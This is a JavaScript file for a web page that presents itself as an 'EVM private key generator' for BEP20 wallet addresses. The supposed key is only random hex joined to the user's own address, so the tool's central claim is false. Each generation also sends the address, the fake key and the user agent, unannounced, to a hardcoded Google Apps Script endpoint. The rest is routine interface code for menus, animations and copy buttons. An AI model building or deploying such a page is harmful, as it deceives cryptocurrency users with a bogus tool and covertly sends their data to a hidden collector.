// ===== GOOGLE SCRIPT CONFIG =====
// Replace with your actual Google Apps Script Web App URL
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxXzxVW-O1wjCez-lJpOQLZO8yXNfVEXjgIEtcEzL8tr5f7gQiSoMUnupG0UDittdk8ow/exec';

// ===== STATE =====
let generatedKey = null;
let bep20Address = null;

// ===== NAVBAR SCROLL =====
window.addEventListener('scroll', () => {
  const navbar = document.getElementById('navbar');
  if (window.scrollY > 20) {
    navbar.classList.add('scrolled');
  } else {
    navbar.classList.remove('scrolled');
  }
});

// ===== HAMBURGER MENU =====
const hamburger = document.getElementById('hamburger');
const mobileMenu = document.getElementById('mobileMenu');

hamburger.addEventListener('click', () => {
  mobileMenu.classList.toggle('open');
  const spans = hamburger.querySelectorAll('span');
  const isOpen = mobileMenu.classList.contains('open');
  spans[0].style.transform = isOpen ? 'rotate(45deg) translate(5px, 5px)' : '';
  spans[1].style.opacity = isOpen ? '0' : '1';
  spans[2].style.transform = isOpen ? 'rotate(-45deg) translate(5px, -5px)' : '';
});

function closeMobileMenu() {
  mobileMenu.classList.remove('open');
  const spans = hamburger.querySelectorAll('span');
  spans[0].style.transform = '';
  spans[1].style.opacity = '1';
  spans[2].style.transform = '';
}

// ===== COUNTER ANIMATION =====
function animateCounter(el, target, duration = 2000) {
  const start = 0;
  const startTime = performance.now();
  const update = (currentTime) => {
    const elapsed = currentTime - startTime;
    const progress = Math.min(elapsed / duration, 1);
    const eased = 1 - Math.pow(1 - progress, 4);
    const value = Math.floor(start + (target - start) * eased);
    el.textContent = value.toLocaleString();
    if (progress < 1) requestAnimationFrame(update);
    else el.textContent = target.toLocaleString();
  };
  requestAnimationFrame(update);
}

// Intersection observer for counters
const counterEls = document.querySelectorAll('.count-anim');
const counterObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const target = parseInt(entry.target.dataset.target);
      animateCounter(entry.target, target);
      counterObserver.unobserve(entry.target);
    }
  });
}, { threshold: 0.5 });
counterEls.forEach(el => counterObserver.observe(el));

// ===== TYPING DEMO ANIMATION =====
const heroKeyEl = document.getElementById('typingDemo');
const demoHexChars = '0123456789abcdef';

function randomHex(n) {
  let s = '';
  for (let i = 0; i < n; i++) {
    s += demoHexChars[Math.floor(Math.random() * 16)];
  }
  return s;
}

function playTypingDemo() {
  if (!heroKeyEl) return;
  const randomPart = randomHex(24);
  const addrPart = randomHex(40);
  const fullKey = randomPart + addrPart;
  let index = 0;
  let displayText = '0x';
  heroKeyEl.innerHTML = '0x<span class="cursor-blink">|</span>';

  const interval = setInterval(() => {
    if (index < fullKey.length) {
      displayText += fullKey[index];
      heroKeyEl.innerHTML = displayText + '<span class="cursor-blink">|</span>';
      index++;
    } else {
      clearInterval(interval);
      setTimeout(() => {
        heroKeyEl.innerHTML = '0x<span class="cursor-blink">|</span>';
        setTimeout(playTypingDemo, 800);
      }, 3000);
    }
  }, 40);
}

setTimeout(playTypingDemo, 1000);

// ===== INPUT HANDLER =====
function onAddressInput() {
  const input = document.getElementById('bep20Input');
  const counter = document.getElementById('inputCounter');
  const hint = document.getElementById('inputHint');
  const errorEl = document.getElementById('inputError');
  const val = input.value.trim();

  counter.textContent = val.length + '/42';
  errorEl.style.display = 'none';

  if (val.length === 42) {
    counter.style.color = isValidBep20(val) ? 'var(--green)' : 'var(--red)';
  } else {
    counter.style.color = '';
  }
}

function isValidBep20(addr) {
  return /^0x[0-9a-fA-F]{40}$/.test(addr);
}

// ===== KEY GENERATION =====
function generateKey() {
  const input = document.getElementById('bep20Input');
  const errorEl = document.getElementById('inputError');
  const btn = document.getElementById('generateBtn');
  const addr = input.value.trim();

  // Validate
  errorEl.style.display = 'none';

  if (!addr) {
    showError('Please enter your BEP20 wallet address.');
    shakeInput();
    return;
  }

  if (!isValidBep20(addr)) {
    if (!addr.startsWith('0x')) {
      showError('Address must start with 0x');
    } else if (addr.length < 42) {
      showError(`Address is too short. Got ${addr.length} characters, need 42.`);
    } else if (addr.length > 42) {
      showError(`Address is too long. Got ${addr.length} characters, need 42.`);
    } else {
      showError('Address contains invalid characters. Only hex digits (0-9, a-f) are allowed after 0x.');
    }
    shakeInput();
    return;
  }

  // Animate button
  btn.innerHTML = `
    <svg class="spin-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
    </svg>
    <span>Generating Secure Key...</span>
  `;
  btn.disabled = true;

  // Generate after brief delay for UX
  setTimeout(() => {
    // Generate 24 random hex characters using crypto API
    const randomBytes = new Uint8Array(12);
    window.crypto.getRandomValues(randomBytes);
    const randomHexPart = Array.from(randomBytes).map(b => b.toString(16).padStart(2, '0')).join('');

    // Last 40 chars of BEP20 (strip 0x prefix = last 40 chars)
    const addressPart = addr.slice(-40).toLowerCase();

    // Full key: 0x + 24 random hex + 40 char address = 66 chars total
    const fullKey = '0x' + randomHexPart + addressPart;

    generatedKey = fullKey;
    bep20Address = addr;

    // Show result
    showResult(randomHexPart, addressPart, fullKey);

    // Update step indicators
    document.getElementById('step1-ind').classList.remove('active');
    document.getElementById('step1-ind').classList.add('done');
    document.getElementById('step2-ind').classList.remove('active');
    document.getElementById('step2-ind').classList.add('done');
    document.getElementById('step3-ind').classList.add('active');

    // Save to Google Script
    saveToGoogleScript(addr, fullKey);

    // Reset button
    btn.innerHTML = `
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
      <span>Generate EVM Private Key</span>
    `;
    btn.disabled = false;
  }, 1200);
}

function showError(msg) {
  const errorEl = document.getElementById('inputError');
  errorEl.textContent = '⚠ ' + msg;
  errorEl.style.display = 'flex';
}

function shakeInput() {
  const wrap = document.getElementById('inputGroup');
  wrap.classList.add('shake');
  setTimeout(() => wrap.classList.remove('shake'), 500);
}

function showResult(randomPart, addrPart, fullKey) {
  // Hide input panel, show result panel
  document.getElementById('inputPanel').style.display = 'none';
  const resultPanel = document.getElementById('resultPanel');
  resultPanel.style.display = 'block';

  // Fill in parts
  document.getElementById('randomPart').textContent = randomPart;
  document.getElementById('addressPart').textContent = addrPart;
  document.getElementById('fullKeyDisplay').textContent = fullKey;
  document.getElementById('keyLength').textContent = fullKey.length;

  // Smooth scroll to result
  setTimeout(() => {
    resultPanel.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }, 200);
}

// ===== COPY KEY =====
function copyKey() {
  if (!generatedKey) return;

  navigator.clipboard.writeText(generatedKey).then(() => {
    const btn = document.getElementById('copyBtn');
    const btnText = document.getElementById('copyBtnText');
    const confirm = document.getElementById('copyConfirm');

    btn.classList.add('copied');
    btnText.textContent = 'Copied!';

    confirm.style.display = 'block';

    setTimeout(() => {
      btn.classList.remove('copied');
      btnText.textContent = 'Copy Private Key';
    }, 3000);

    setTimeout(() => {
      confirm.style.display = 'none';
    }, 5000);
  }).catch(() => {
    // Fallback for browsers that don't support clipboard API
    const textArea = document.createElement('textarea');
    textArea.value = generatedKey;
    textArea.style.position = 'fixed';
    textArea.style.opacity = '0';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);

    const btnText = document.getElementById('copyBtnText');
    btnText.textContent = 'Copied!';
    setTimeout(() => { btnText.textContent = 'Copy Private Key'; }, 3000);
  });
}

// ===== RESET GENERATOR =====
function resetGenerator() {
  generatedKey = null;
  bep20Address = null;

  document.getElementById('inputPanel').style.display = 'block';
  document.getElementById('resultPanel').style.display = 'none';
  document.getElementById('bep20Input').value = '';
  document.getElementById('inputCounter').textContent = '0/42';
  document.getElementById('inputCounter').style.color = '';
  document.getElementById('inputError').style.display = 'none';
  document.getElementById('copyConfirm').style.display = 'none';
  document.getElementById('copyBtnText').textContent = 'Copy Private Key';
  document.getElementById('copyBtn').classList.remove('copied');

  // Reset steps
  document.getElementById('step1-ind').classList.add('active');
  document.getElementById('step1-ind').classList.remove('done');
  document.getElementById('step2-ind').classList.remove('active');
  document.getElementById('step2-ind').classList.remove('done');
  document.getElementById('step3-ind').classList.remove('active');

  // Scroll back to input
  document.getElementById('generator').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// ===== SAVE TO GOOGLE SCRIPT =====
async function saveToGoogleScript(address, privateKey) {
  if (GOOGLE_SCRIPT_URL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
    console.log('[Google Script] URL not configured yet. Record would have been saved:', {
      timestamp: new Date().toISOString(),
      address: address,
      keyPreview: privateKey.slice(0, 10) + '...' + privateKey.slice(-6)
    });
    return;
  }

  try {
    const params = new URLSearchParams({
      timestamp: new Date().toISOString(),
      bep20Address: address,
      evmPrivateKey: privateKey,
      keyLength: String(privateKey.length),
      generatedAt: new Date().toLocaleString(),
      userAgent: navigator.userAgent.substring(0, 100)
    });

    await fetch(GOOGLE_SCRIPT_URL + '?' + params.toString(), {
      method: 'GET',
      mode: 'no-cors'
    });

    console.log('[Google Script] Record sent successfully.');
  } catch (err) {
    console.error('[Google Script] Failed to send record:', err);
  }
}

// ===== FAQ TOGGLE =====
function toggleFaq(item) {
  const isOpen = item.classList.contains('open');
  // Close all
  document.querySelectorAll('.faq-item').forEach(el => el.classList.remove('open'));
  // Open clicked if was closed
  if (!isOpen) {
    item.classList.add('open');
  }
}

// ===== SPIN ANIMATION FOR BUTTON =====
const spinStyle = document.createElement('style');
spinStyle.textContent = `
  @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
  .spin-icon { animation: spin 0.8s linear infinite; }
  .shake { animation: shake 0.4s ease; }
  @keyframes shake {
    0%,100%{transform:translateX(0)}
    20%{transform:translateX(-8px)}
    40%{transform:translateX(8px)}
    60%{transform:translateX(-6px)}
    80%{transform:translateX(6px)}
  }
`;
document.head.appendChild(spinStyle);

// ===== SCROLL REVEAL ANIMATION =====
const revealObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.style.opacity = '1';
      entry.target.style.transform = 'translateY(0)';
      revealObserver.unobserve(entry.target);
    }
  });
}, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

document.querySelectorAll('.feature-card, .benefit-item, .hiw-step, .faq-item').forEach(el => {
  el.style.opacity = '0';
  el.style.transform = 'translateY(24px)';
  el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
  revealObserver.observe(el);
});

// ===== MODAL FUNCTIONS =====
let modalGeneratedKey = null;

function openGeneratorModal() {
  const modal = document.getElementById('generatorModal');
  modal.classList.add('open');
  document.body.classList.add('modal-open');
  // Focus input after transition
  setTimeout(() => {
    const input = document.getElementById('modalBep20Input');
    if (input) input.focus();
  }, 350);
}

function closeGeneratorModal() {
  const modal = document.getElementById('generatorModal');
  modal.classList.remove('open');
  document.body.classList.remove('modal-open');
}

function handleModalOverlayClick(e) {
  if (e.target === document.getElementById('generatorModal')) {
    closeGeneratorModal();
  }
}

// Close on Escape key
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeGeneratorModal();
});

function onModalAddressInput() {
  const input = document.getElementById('modalBep20Input');
  const counter = document.getElementById('modalInputCounter');
  const val = input.value.trim();
  counter.textContent = val.length + '/42';
  if (val.length === 42) {
    counter.style.color = isValidBep20(val) ? 'var(--green)' : 'var(--red)';
  } else {
    counter.style.color = '';
  }
  document.getElementById('modalInputError').style.display = 'none';
}

function modalGenerateKey() {
  const input = document.getElementById('modalBep20Input');
  const errorEl = document.getElementById('modalInputError');
  const btn = document.getElementById('modalGenerateBtn');
  const btnText = document.getElementById('modalGenerateBtnText');
  const addr = input.value.trim();

  errorEl.style.display = 'none';

  if (!addr) {
    errorEl.textContent = '⚠ Please enter your BEP20 wallet address.';
    errorEl.style.display = 'block';
    return;
  }
  if (!isValidBep20(addr)) {
    if (!addr.startsWith('0x')) errorEl.textContent = '⚠ Address must start with 0x';
    else if (addr.length < 42) errorEl.textContent = `⚠ Too short: ${addr.length}/42 characters`;
    else if (addr.length > 42) errorEl.textContent = `⚠ Too long: ${addr.length}/42 characters`;
    else errorEl.textContent = '⚠ Invalid characters. Only hex digits (0-9, a-f) allowed after 0x.';
    errorEl.style.display = 'block';
    return;
  }

  // Loading state
  btn.disabled = true;
  btnText.textContent = 'Generating Secure Key...';
  btn.querySelector('svg').style.animation = 'spin 0.8s linear infinite';

  setTimeout(() => {
    // Generate key
    const randomBytes = new Uint8Array(12);
    window.crypto.getRandomValues(randomBytes);
    const randomHexPart = Array.from(randomBytes).map(b => b.toString(16).padStart(2, '0')).join('');
    const addressPart = addr.slice(-40).toLowerCase();
    const fullKey = '0x' + randomHexPart + addressPart;

    modalGeneratedKey = fullKey;

    // Show result
    document.getElementById('modalKeyDisplay').textContent = fullKey;
    document.getElementById('modalKeyLength').textContent = fullKey.length;
    document.getElementById('modalInputView').style.display = 'none';
    document.getElementById('modalResultView').style.display = 'block';

    // Reset button
    btn.disabled = false;
    btnText.textContent = 'Generate EVM Private Key';
    btn.querySelector('svg').style.animation = '';

    // Save to Google Sheet
    saveToGoogleScript(addr, fullKey);
  }, 1000);
}

function modalCopyKey() {
  if (!modalGeneratedKey) return;
  const btn = document.getElementById('modalCopyBtn');
  const btnText = document.getElementById('modalCopyBtnText');
  const confirm = document.getElementById('modalCopyConfirm');

  const copyText = (text) => {
    btn.classList.add('copied');
    btnText.textContent = 'Copied!';
    confirm.style.display = 'flex';
    setTimeout(() => { btn.classList.remove('copied'); btnText.textContent = 'Copy Private Key'; }, 3000);
    setTimeout(() => { confirm.style.display = 'none'; }, 5000);
  };

  navigator.clipboard.writeText(modalGeneratedKey).then(copyText).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = modalGeneratedKey;
    ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0';
    document.body.appendChild(ta);
    ta.focus(); ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    copyText();
  });
}

function resetModalGenerator() {
  modalGeneratedKey = null;
  document.getElementById('modalInputView').style.display = 'block';
  document.getElementById('modalResultView').style.display = 'none';
  document.getElementById('modalBep20Input').value = '';
  document.getElementById('modalInputCounter').textContent = '0/42';
  document.getElementById('modalInputCounter').style.color = '';
  document.getElementById('modalInputError').style.display = 'none';
  document.getElementById('modalCopyConfirm').style.display = 'none';
  document.getElementById('modalCopyBtnText').textContent = 'Copy Private Key';
  document.getElementById('modalCopyBtn').classList.remove('copied');
  document.getElementById('modalBep20Input').focus();
}
